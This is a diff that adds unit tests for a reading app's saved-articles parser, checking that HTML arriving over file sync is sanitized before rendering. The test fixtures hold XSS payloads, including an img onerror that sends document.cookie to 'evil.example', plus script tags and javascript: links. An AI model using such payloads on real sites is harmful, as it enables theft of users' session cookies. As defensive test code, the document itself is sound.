@@ -19,6 +19,7 @@ import {
   type SavedArticleInput,
 } from "../../src/reading/saved-articles";
 import { toSavedArticleInput } from "../../src/ui/components/info/saveArticle";
+import { articleHtmlForWebview } from "../../src/platform/app/image-proxy";
 
 function input(over: Partial<SavedArticleInput> = {}): SavedArticleInput {
   return {
@@ -175,6 +176,71 @@ test("parseSavedArticles drops entries without an identity and survives garbage"
   expect(parseSavedArticles(text).map((a) => a.id)).toEqual([good.id]);
   expect(parseSavedArticles("not json")).toEqual([]);
   expect(parseSavedArticles('{"articles":[]}')).toEqual([]);
+});
+
+// saved-articles.json sits in the synced folder and merges record by record, so
+// a record can reach this device without ever having gone through saveArticle:
+// a shared folder, a second device, the Drive account. SavedArticleView hands
+// `html` to dangerouslySetInnerHTML, so the read is the trust boundary — the
+// write-side sanitizing guards nothing against someone who writes the file.
+// This walks the whole read path, ending on the exact string the view computes.
+function hostileFile(html: string): string {
+  return JSON.stringify([
+    {
+      id: "https://example.com/a",
+      topicId: "brief",
+      url: "https://example.com/a",
+      title: "A title",
+      source: "src",
+      sourceName: "Source",
+      publishedAt: "",
+      savedAt: 1,
+      summaryOnly: false,
+      text: "",
+      html,
+    },
+  ]);
+}
+
+test("parseSavedArticles neutralizes a body that arrived over sync, not through saveArticle", () => {
+  const [article] = parseSavedArticles(
+    hostileFile(
+      `<img src=x onerror="fetch('https://evil.example/'+document.cookie)">` +
+        `<script>alert(1)</script>` +
+        `<a href="javascript:alert(2)">go</a>` +
+        `<p onmouseover=alert(3)>text</p>`,
+    ),
+  );
+  // What SavedArticleView passes to dangerouslySetInnerHTML.
+  const rendered = articleHtmlForWebview(article.html, article.url);
+  expect(rendered).not.toContain("onerror");
+  expect(rendered).not.toContain("onmouseover");
+  expect(rendered).not.toContain("<script");
+  expect(rendered).not.toContain("javascript:");
+  expect(rendered).toBe("<a>go</a><p>text</p>");
+});
+
+// data:image/svg+xml is markup, and the sanitizer keeps an inline data: image
+// when the tag holds no other usable URL — so the read strips data images too,
+// the same rule the write side applies for size.
+test("parseSavedArticles drops an inlined data: image reaching it from the file", () => {
+  const [article] = parseSavedArticles(
+    hostileFile(`<p>a</p><img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="><p>b</p>`),
+  );
+  expect(article.html).toBe("<p>a</p><p>b</p>");
+});
+
+// The read guard must not chew up an honest record: an article kept yesterday
+// renders the same today.
+test("parseSavedArticles leaves an ordinary saved body alone", () => {
+  const html = `<p>Real prose with <b>bold</b>.</p><img src="https://cdn.example/a.jpg" loading="lazy">`;
+  const [article] = parseSavedArticles(hostileFile(html));
+  expect(article.html).toBe(html);
+});
+
+test("parseSavedArticles survives a record whose html is not a string", () => {
+  const text = JSON.stringify([{ id: "x", html: 42 }, { id: "y" }]);
+  expect(parseSavedArticles(text).map((a) => a.html)).toEqual(["", ""]);
 });
 
 test("formatPublishedAt shows an unparseable date verbatim and nothing for none", () => {
